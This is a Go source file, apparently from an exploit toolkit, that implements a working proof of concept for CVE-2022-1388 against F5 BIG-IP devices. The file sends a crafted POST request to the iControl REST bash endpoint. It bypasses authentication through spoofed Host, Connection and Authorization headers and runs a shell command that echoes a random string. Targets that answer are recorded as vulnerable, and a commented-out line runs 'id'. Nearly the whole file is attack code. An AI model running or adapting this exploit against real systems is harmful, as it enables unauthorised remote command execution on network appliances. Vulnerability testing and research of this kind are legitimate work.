package _022

// 参考 https://github.com/numanturle/CVE-2022-1388/blob/main/bigip-icontrol-rest-rce.yaml
import (
	"encoding/json"
	req2 "github.com/SummerSec/SpringExploit/cmd/commons/req"
	"github.com/SummerSec/SpringExploit/cmd/commons/utils"
	"github.com/fatih/structs"
	"github.com/imroc/req/v3"
	log "github.com/sirupsen/logrus"
	"net/url"
	"strings"
)

type CVE20221388 struct{}

func (t CVE20221388) SendPoc(target string, hashmap map[string]interface{}) {
	log.Debug("[+] Start CVE-2022-1388")

	reqinfo := req2.NewReqInfo()
	reqmap := structs.Map(reqinfo)

	// 初始化请求
	// TODO 可以设置超时时间 重复次数 代理等 下面默认使用默认值
	reqmap["timeout"] = hashmap["Timeout"].(int)
	reqmap["retry"] = hashmap["Retry"].(int)
	reqmap["proxy"] = hashmap["Proxy"].(string)
	reqmap["mode"] = hashmap["Mode"].(int)

	u, _ := url.Parse(target)
	path := "/mgmt/tm/util/bash"
	reqmap["url"] = u.Scheme + "://" + u.Host + path
	reqmap["method"] = "POST"

	headers := map[string]string{
		"Host":            "localhost",
		"User-Agent":      utils.GetUA(),
		"Connection":      "keep-alive,x-f5-auTh-tOKen",
		"Authorization":   "Basic YWRtaW46",
		"X-F5-Auth-Token": utils.GetCode(5),
		"Content-Type":    "application/json",
	}

	reqmap["headers"] = headers

	randstr := utils.GetCode(10)
	log.Debugf("[+] randstr: %s", randstr)
	base64str := utils.EncodeString(randstr)
	log.Debugf("[+] base64str: %s", base64str)

	reqmap["body"] = "{\"command\":\"run\",\"utilCmdArgs\":\"-c 'echo " + base64str + " | base64 -d'\"}"
	//reqmap["body"] = "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
	log.Debug("[+] Send CVE-2022-1388 request")
	resp := utils.Send(reqmap)

	if t.CheckExp(resp, randstr, hashmap) {
		t.SaveResult(target, hashmap["Out"].(string))

	}

}

func (CVE20221388) SaveResult(target string, file string) {
	result := target + " 存在 CVE-2022-1388漏洞"
	err := utils.SaveToFile(result, file)
	log.Info(result)
	if err != nil {
		return
	}

}

func (CVE20221388) CheckExp(resp *req.Response, randstr string, hashmap map[string]interface{}) bool {
	res := resp.String()
	log.Debugf(res)
	if strings.Contains(res, randstr) {
		// 将res 转化成map
		var maps map[string]interface{}
		err := json.Unmarshal([]byte(res), &maps)
		log.Info("CVE-2022-1388 命令执行返回 commandResult: ", maps["commandResult"])
		if err != nil {
			log.Debugf("[-] json.Unmarshal error: %s", err)
			return false
		}
		return true
	}
	return false
}
